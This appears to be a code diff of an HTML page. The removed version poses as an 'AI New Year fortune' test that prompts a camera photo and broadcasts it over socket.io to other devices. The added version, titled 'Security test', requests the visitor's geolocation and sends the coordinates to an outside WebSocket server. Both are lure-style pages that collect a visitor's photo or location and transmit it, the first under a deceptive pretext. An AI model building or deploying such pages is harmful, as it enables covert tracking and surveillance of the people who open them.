@@ -3,62 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>专业AI测试新年运势</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
+    <title>安全测试</title>
+    <style>
+        #map {
+            height: 400px;
+            width: 100%;
+        }
+    </style>
 </head>
 <body>
-    <h1>专业AI测试你的新年运势</h1>
+    <h1>安全测试</h1>
 
-    <!-- 显示照片的元素 -->
-    <img id="remotePhoto" width="320" height="240">
+    <!-- 显示地图的容器 -->
+    <div id="map"></div>
 
-    <!-- 请求摄像头权限按钮 -->
-    <button id="takePhotoBtn">拍照</button>
+    <!-- 请求定位权限按钮 -->
+    <button id="requestLocationBtn">请求定位权限</button>
 
     <script>
-        const remotePhoto = document.getElementById('remotePhoto');
-        const takePhotoBtn = document.getElementById('takePhotoBtn');
-        const socket = io();
+        // 初始化地图
+        let map;
 
-        takePhotoBtn.addEventListener('click', () => {
-            // 触发手机摄像头拍照
-            capturePhoto();
+        // 初始化WebSocket连接
+        const socket = new WebSocket('wss://echo.websocket.org');
+
+        // 当连接打开时
+        socket.addEventListener('open', (event) => {
+            console.log('WebSocket 连接已打开');
         });
 
-        function capturePhoto() {
-            // 使用input元素选择文件的方式触发拍照
-            const input = document.createElement('input');
-            input.type = 'file';
-            input.accept = 'image/*';
-            input.capture = 'camera';
-            input.addEventListener('change', handleFileSelect, false);
-            input.click();
-        }
+        // 当收到消息时
+        socket.addEventListener('message', (event) => {
+            const data = JSON.parse(event.data);
+            console.log('接收到位置数据:', data);
+            updateMap(data.latitude, data.longitude);
+        });
 
-        function handleFileSelect(event) {
-            const file = event.target.files[0];
+        // 请求定位权限按钮点击事件
+        document.getElementById('requestLocationBtn').addEventListener('click', () => {
+            // 请求定位权限
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const { latitude, longitude } = position.coords;
 
-            if (file) {
-                // 读取文件内容
-                const reader = new FileReader();
-                reader.onload = function (e) {
-                    const imageDataUrl = e.target.result;
+                    // 更新地图
+                    updateMap(latitude, longitude);
 
-                    // 显示照片
-                    remotePhoto.src = imageDataUrl;
+                    // 发送位置数据到WebSocket服务器
+                    const data = { latitude, longitude };
+                    socket.send(JSON.stringify(data));
 
-                    // 发送照片给其他设备
-                    socket.emit('photo', imageDataUrl);
-                };
-                reader.readAsDataURL(file);
+                    console.log('位置数据已发送:', data);
+                }, (error) => {
+                    console.error('获取定位信息失败:', error.message);
+                });
+            } else {
+                console.error('浏览器不支持定位功能');
+            }
+        });
+
+        // 更新地图函数
+        function updateMap(latitude, longitude) {
+            if (!map) {
+                // 创建地图
+                map = document.getElementById('map');
+                map.innerHTML = `<img src="https://maps.googleapis.com/maps/api/staticmap?center=${latitude},${longitude}&zoom=15&size=400x400&markers=color:red%7C${latitude},${longitude}&key=YOUR_GOOGLE_MAPS_API_KEY" alt="Map">`;
+            } else {
+                // 更新地图
+                map.innerHTML = `<img src="https://maps.googleapis.com/maps/api/staticmap?center=${latitude},${longitude}&zoom=15&size=400x400&markers=color:red%7C${latitude},${longitude}&key=YOUR_GOOGLE_MAPS_API_KEY" alt="Map">`;
             }
         }
-
-        // 监听来自其他设备的照片数据
-        socket.on('photo', (dataUrl) => {
-            // 显示其他设备的照片
-            remotePhoto.src = dataUrl;
-        });
     </script>
 </body>
 </html>
